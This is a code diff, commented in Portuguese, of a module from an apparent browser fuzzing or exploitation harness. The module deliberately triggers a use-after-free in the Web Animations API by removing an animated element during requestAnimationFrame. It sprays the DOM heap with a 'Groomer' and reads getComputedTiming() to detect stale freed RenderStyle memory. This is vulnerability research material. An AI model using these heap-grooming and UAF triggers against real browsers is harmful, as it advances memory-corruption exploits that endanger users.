@@ -1,73 +1,76 @@
-import { GCOracle } from '../mod_executor.js';
 import { Groomer } from '../mod_groomer.js';
 
 export default {
     id:       'CSS_ANIMATION_REMOVED_ELEMENT',
-    category: 'Rendering',
-    risk:     'MEDIUM',
+    category: 'DOM',
+    risk:     'HIGH',
     description:
-        'Múltiplas animações CSS + Web Animations API em elemento removido. ' +
-        'Remove durante requestAnimationFrame para coincidir com frame tick. ' +
-        'AnimationTimeline pode manter ptr para RenderStyle freed.',
+        'UAF via Web Animations API. Inicia uma animação complexa de Transform e ' +
+        'destrói o elemento dentro de um requestAnimationFrame (rAF). A tentativa de ' +
+        'ler o getComputedTiming() da animação morta acede ao RenderStyle C++ libertado.',
 
     setup: function() {
-        this.style = document.createElement('style');
-        this.style.textContent = `
-            @keyframes fuzz-t  { 0%{transform:translateX(0)  rotate(0deg)}   100%{transform:translateX(80px) rotate(360deg)} }
-            @keyframes fuzz-o  { 0%{opacity:1}                                100%{opacity:0.1} }
-            .fuzz-multi {
-                animation: fuzz-t 0.07s linear infinite, fuzz-o 0.05s ease infinite alternate;
-                width: 60px; height: 60px; background: red; position: absolute;
-                will-change: transform, opacity;
-            }
-        `;
-        document.head.appendChild(this.style);
+        this.results = {};
+        this.sandbox = document.getElementById('groomer-sandbox');
+        
+        this.target = document.createElement('div');
+        this.target.style.width = "100px";
+        this.sandbox.appendChild(this.target);
+        
+        void this.target.offsetWidth; // Força layout nativo
 
-        this.el = document.createElement('div');
-        this.el.className = 'fuzz-multi';
-        document.body.appendChild(this.el);
-
-        this.webAnim = this.el.animate([
-            { backgroundColor: 'red',  transform: 'scale(1)'   },
-            { backgroundColor: 'blue', transform: 'scale(1.5)' },
-        ], { duration: 60, iterations: Infinity, easing: 'ease-in-out' });
-
-        this.animLog = [];
-        this.el.addEventListener('animationiteration', () => {
-            try { this.animLog.push({ rect: this.el.getBoundingClientRect() }); }
-            catch(e) { this.animLog.push({ err: e.message }); }
-        });
-
-        // 🚨 Oráculo: Registra o elemento a ser destruído
-        if (GCOracle.registry) GCOracle.registry.register(this.el, `${this.id}_target`);
+        // Criamos uma animação infinita gerida pelo C++
+        this.anim = this.target.animate(
+            [{ transform: 'translateX(0px)' }, { transform: 'translateX(1000px)' }], 
+            { duration: 1000, iterations: Infinity }
+        );
     },
 
-    trigger: function() {
-        requestAnimationFrame(() => {
-            this.el.remove();
-            
-            // 🚨 Grooming: Esburaca o Heap do bmalloc (DOM)
-            let nodes = Groomer.sprayDOM('div', 200);
-            Groomer.punchHoles(nodes, 2);
+    trigger: async function() {
+        const self = this;
+        return new Promise(resolve => {
+            // Sincronizamos a destruição com o "Tick" de desenho da tela (60Hz)
+            requestAnimationFrame(() => {
+                try {
+                    // O GATILHO: Arranca o alvo do DOM a meio do cálculo de matrizes
+                    self.target.remove();
+                    
+                    // Inundação imediata para tentar sobrepor o RenderStyle
+                    let trash = Groomer.sprayDOM('div', 200);
 
-            try { this.webAnim.play(); } catch(e) {}
+                    // A BOMBA: Lemos o estado calculado da animação.
+                    // O C++ tem de ir ao Elemento/RenderStyle morto para devolver a resposta!
+                    self.results.timing = self.anim.effect.getComputedTiming().progress;
+                } catch(e) {
+                    self.results.error = e.message;
+                }
+                resolve();
+            });
         });
     },
 
     probe: [
-        s => s.el.getAnimations?.().length,
-        s => s.el.getAnimations?.()[0]?.playState,
-        s => s.el.getAnimations?.()[0]?.currentTime,
-        s => s.webAnim?.playState,
-        s => s.el.getBoundingClientRect().x,
-        s => getComputedStyle(s.el).transform,
-        s => getComputedStyle(s.el).animationPlayState,
-        s => s.animLog.length,
-        s => s.animLog.some(l => l.err) ? 'ANIM_CALLBACK_ERROR' : 'ok',
+        s => s.results.error || 'rAF Executado',
+        
+        // Probe de STALE DATA
+        s => {
+            let prog = s.results.timing;
+            if (typeof prog === 'number') {
+                // O progresso deve ser um float entre 0.0 e 1.0. 
+                // Se for um número absurdo, o C++ leu ponteiros em vez do tempo de animação!
+                if (prog < 0 || prog > 100) {
+                    return prog; // Dispara STALE DATA no HUD
+                }
+            }
+            return 0; // Seguro
+        }
     ],
 
     cleanup: function() {
-        try { this.webAnim?.cancel(); } catch(e) {}
-        try { this.style.remove(); } catch(e) {}
+        try { this.anim.cancel(); } catch(e){}
+        try { this.target.remove(); } catch(e){}
+        this.target = null;
+        this.anim = null;
+        this.results = {};
     }
 };
